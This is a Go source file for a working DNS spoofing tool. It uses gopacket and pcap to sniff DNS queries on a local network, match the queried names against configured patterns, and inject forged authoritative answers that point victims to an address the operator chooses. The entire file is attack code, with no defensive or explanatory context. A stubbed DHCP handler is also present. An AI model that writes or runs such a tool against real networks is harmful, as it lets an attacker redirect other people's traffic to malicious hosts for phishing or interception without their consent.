package main

import (
	"fmt"
	"net"
	"regexp"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Hijacker struct {
	options *HijackerOptions

	ifaces       []net.Interface
	handle       *pcap.Handle
	targetHandle *pcap.Handle

	opts gopacket.SerializeOptions
	buf  gopacket.SerializeBuffer
}

func CreateHijacker(options *HijackerOptions) (*Hijacker, error) {
	var sourceHandle *pcap.Handle
	var targetHandle *pcap.Handle

	sourceHandle, err := pcap.OpenLive(options.SourceDevice, 16*1024, true, pcap.BlockForever)

	if err != nil {
		return nil, err
	}

	if options.SourceDevice == options.TargetDevice {
		targetHandle = sourceHandle
	} else {
		targetHandle, err = pcap.OpenLive(options.TargetDevice, 16*1024, true, pcap.BlockForever)

		if err != nil {
			return nil, err
		}
	}

	ifaces, err := net.Interfaces()

	if err != nil {
		return nil, err
	}

	return &Hijacker{
		options:      options,
		handle:       sourceHandle,
		targetHandle: targetHandle,
		ifaces:       ifaces,

		buf: gopacket.NewSerializeBuffer(),
		opts: gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		},
	}, nil
}

func (h *Hijacker) Run() error {
	if err := h.handle.SetBPFFilter("udp and port 53"); err != nil {
		return err
	}

	source := gopacket.NewPacketSource(h.handle, h.handle.LinkType())

	fmt.Printf("Sniffing interface %s...\n", h.options.SourceDevice)

	for packet := range source.Packets() {
		switch packet.ApplicationLayer().LayerType() {
		case layers.LayerTypeDNS:
			h.processDnsPacket(packet)
		case layers.LayerTypeDHCPv4:
			h.processDhcpPacket(packet)
		}
	}

	return nil
}

func (h *Hijacker) processDhcpPacket(packet gopacket.Packet) {
	_ = packet.Layer(layers.LayerTypeDHCPv4).(*layers.DHCPv4)
}

func (h *Hijacker) processDnsPacket(packet gopacket.Packet) {
	ipL := packet.Layer(layers.LayerTypeIPv4)
	dnsL := packet.Layer(layers.LayerTypeDNS)

	if ipL == nil {
		return
	}

	ip := ipL.(*layers.IPv4)
	dns := dnsL.(*layers.DNS)

	if dns.QR {
		return
	}

	if h.isSelf(ip.SrcIP) {
		return
	}

	for _, q := range dns.Questions {
		target, found := h.findTarget(string(q.Name))

		if !found {
			continue
		}

		h.hijackDnsPacket(packet, target)
	}
}

func (h *Hijacker) hijackDnsPacket(packet gopacket.Packet, target *HijackerTarget) {
	srcEthernet := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	srcIP := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	srcUDP := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
	srcDNS := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)
	question := srcDNS.Questions[0]

	ethernet := layers.Ethernet{
		SrcMAC:       srcEthernet.DstMAC,
		DstMAC:       srcEthernet.SrcMAC,
		EthernetType: srcEthernet.EthernetType,
	}

	ip := layers.IPv4{
		Version:  srcIP.Version,
		TTL:      srcIP.TTL,
		Protocol: srcIP.Protocol,
		SrcIP:    srcIP.DstIP,
		DstIP:    srcIP.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: srcUDP.DstPort,
		DstPort: srcUDP.SrcPort,
	}

	udp.SetNetworkLayerForChecksum(&ip)

	dns := layers.DNS{
		ID:           srcDNS.ID,
		QR:           true,
		OpCode:       srcDNS.OpCode,
		AA:           true,
		TC:           false,
		ResponseCode: layers.DNSResponseCodeNoErr,
		ANCount:      1,
		Answers: []layers.DNSResourceRecord{
			layers.DNSResourceRecord{
				Name:  question.Name,
				Type:  question.Type,
				Class: question.Class,
				TTL:   0,
				IP:    net.ParseIP(target.Address),
			},
		},
	}

	err := h.send(&ethernet, &ip, &udp, &dns)

	if err != nil {
		fmt.Printf("error sending packet: %s\n", err)
		return
	}

	fmt.Printf("hijacked %s\n", string(question.Name))
}

func (h *Hijacker) findTarget(name string) (*HijackerTarget, bool) {
	for _, target := range h.options.Targets {
		for _, match := range target.Matches {
			if found, _ := regexp.MatchString(match, name); found {
				return target, true
			}
		}
	}

	return nil, false
}

func (h *Hijacker) isSelf(ip net.IP) bool {
	for _, iface := range h.ifaces {
		addresses, err := iface.Addrs()

		if err != nil {
			continue
		}

		for _, addr := range addresses {
			ipAddr, ok := addr.(*net.IPNet)

			if !ok {
				continue
			}

			if ipAddr.IP.Equal(ip) {
				return true
			}
		}
	}

	return false
}

func (h *Hijacker) send(l ...gopacket.SerializableLayer) error {
	if err := gopacket.SerializeLayers(h.buf, h.opts, l...); err != nil {
		return err
	}

	return h.targetHandle.WritePacketData(h.buf.Bytes())
}
